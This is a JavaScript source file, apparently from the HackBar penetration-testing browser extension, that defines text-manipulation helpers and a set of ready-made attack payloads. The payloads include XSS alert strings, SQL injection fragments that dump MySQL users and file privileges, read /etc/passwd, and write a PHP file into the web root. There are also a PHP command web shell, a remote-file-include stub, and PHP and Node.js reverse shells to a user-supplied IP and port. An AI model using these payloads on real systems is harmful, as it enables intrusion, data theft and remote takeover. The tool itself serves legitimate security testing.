HackBar.Strings = {
	
	hackBarUsefullStrings : {
	    pi: "3,14159265",
	    phi: "1.618033988749895",
	    piBig: "3,14159265358979323846264338327950288419716939937510",
	    lorem: "Lorem ipsum dolor sit amet, consectetur adipisicing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat. Duis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur. Excepteur sint occaecat cupidatat non proident, sunt in culpa qui officia deserunt mollit anim id est laborum.",
	    fibonacci: "0, 1, 1, 2, 3, 5, 8, 13, 21, 34, 55, 89, 144, 233, 377, 610, 987, 1597, 2584, 4181, 6765, 10946, ...",
	    alert: "alert(String.from+CharCode(88, 83, 83))",
		alert1: "'); alert('XSS",
	    br: "0x3c62723e",
	    separatorbr: "0x3c62723e",
	    li: "0x3c6c693e",
	    b: "0x3c623e",
	    cb: "0x3c2f623e",
		filepriv: "CONCAT(0x44617461646972203a,@@datadir,0x3c62723e43757272656e742055736572203a,user(),0x3c62723e3c68723e,(SELECT+GROUP_CONCAT(user,0x3a,file_priv+SEPARATOR+0x3c62723e)+FROM+mysql.user))",
	    loadfile: "load_file('/etc/passwd')",
	    intooutfile: "+INTO+OUTFILE+'/var/www/html/pescyte.php'",
	    fontfc: "0x3c666f6e7420666163653d636f75726965723e",
	    fontred: "0x3c666f6e7420636f6c6f723d7265643e",
	    fontblue: "0x3c666f6e7420636f6c6f723d626c75653e",
	    fontgreen: "0x3c666f6e7420636f6c6f723d677265656e3e",
	    fontpurple: "0x3c666f6e7420636f6c6f723d707572706c653e",
	    fontmagenta: "0x3c666f6e7420636f6c6f723d6d6167656e74613e",
	    fontc: "0x3c2f666f6e743e"
	    
  
 

	},
	
	
	
	
	
	
	getUsefullString : function (key) {
		hackBar.setSelectedText(this.hackBarUsefullStrings[key]);
	}, 
	
	// Used by Overflow menu option.
	// Returns a 'A's string to test overflows and application limits
	generateOverflowString : function (stringLength) {
		var result = "";
		while (stringLength < 1) {
			stringLength = prompt("Length of the string to use in the overflow:", "1337");
			stringLength = Math.min(4096, parseInt(stringLength, 10));
		}
		
		for (var i = 0; i < stringLength; i++) {
			result += "A";
		}
		hackBar.setSelectedText(result);
	}, 
	
	// Reverse a string 
	reverseString : function () {
		var originalString = hackBar.getSelectedText();
		var splitext = originalString.split("");
		var revertext = splitext.reverse();
		var reversed = revertext.join("");
		hackBar.setSelectedText(reversed);
	},
	
	lowercaseString : function () {
    var txt = hackBar.getSelectedText();
    hackBar.setSelectedText( txt.toLowerCase() )    
	},
	
	uppercaseString : function () {
    var txt = hackBar.getSelectedText();
    hackBar.setSelectedText( txt.toUpperCase() )
    },
	
   randomcaseString : function () {
    var txt = hackBar.getSelectedText();
    var newString = ""
    for(i = 0;i<txt.length;i++){
      var rand = Math.random()*10;
      if(rand > 5){
        newString += txt.charAt(i).toUpperCase();
      } else {
        newString += txt.charAt(i).toLowerCase();
      }
    }
    hackBar.setSelectedText( newString )
    },
	
	phpbackdoor : function () {
    hackBar.setSelectedText( "<?php echo system($_GET[\"cmd\"]); ?>" )
   },
   
  phprevshell : function () {
    var ip = prompt("IP Address?");
    var port = prompt("Port?");
    hackBar.setSelectedText( "<?php system(\"bash -i >& /dev/tcp/"+ip+"/"+port+" 0>&1\"); ?>" )
    },
	
 phprfi : function () {
    hackBar.setSelectedText( "<?php include($_GET[\"file\"]); ?>" )
   },
	
 nodejsrevshell : function () {
     var ip = prompt("IP Address:");
    var port = prompt("Port:");
    hackBar.setSelectedText("require('child_process').exec('bash -i >& /dev/tcp/"+ip+"/"+port+" 0>&1')");
   },
	
stripcustom : function () {
    var str = prompt("String you would like to remove:")
    var txt = hackBar.getSelectedText();
    var re = new RegExp(str, 'g');
    var newString = txt.replace(re, '');
    hackBar.setSelectedText( newString ); 
	  },
	
	addslashes : function () {
		var txt = hackBar.getSelectedText();
		txt = txt.replace(/\\/g, '\\\\');
		txt = txt.replace(/\'/g, "\\'");
		txt = txt.replace(/\"/g, '\\"');
		hackBar.setSelectedText(txt);
	}, 
	
	stripslashes : function () {
		var txt = hackBar.getSelectedText();
		txt = txt.replace(/\\'/g, '\'');
		txt = txt.replace(/\\"/g, '"');
		txt = txt.replace(/\\\\/g, '\\');
		hackBar.setSelectedText(txt);
	}, 
	
	stripspaces : function () {
		var txt = hackBar.getSelectedText();
		txt = txt.replace(/ /g, '');
		hackBar.setSelectedText(txt);
	},
	
	
	binaryencode : function () {
      var txt = this.getSelectedText();
      var newString = HackBar.Encrypt.toBinary(txt);
      this.setSelectedText( newString );
     },
  binarydecode : function () {
      var txt = this.getSelectedText();
      var newString = HackBar.Encrypt.fromBinary(txt);
      this.setSelectedText( newString );
	  },

selectionToMD5: function () {
    var txt = hackBar.getSelectedText();
    var md5_str = HackBar.Encrypt.md5(txt);
    hackBar.setSelectedText( md5_str );
  },

  

selectionToSHA: function ( sha_type ) {
    var txt = hackBar.getSelectedText();
    var sha_str = (sha_type == 1) ? HackBar.Encrypt.sha1(txt) : HackBar.Encrypt.sha2(txt);;
    hackBar.setSelectedText( sha_str );
  },
	
	
	};
 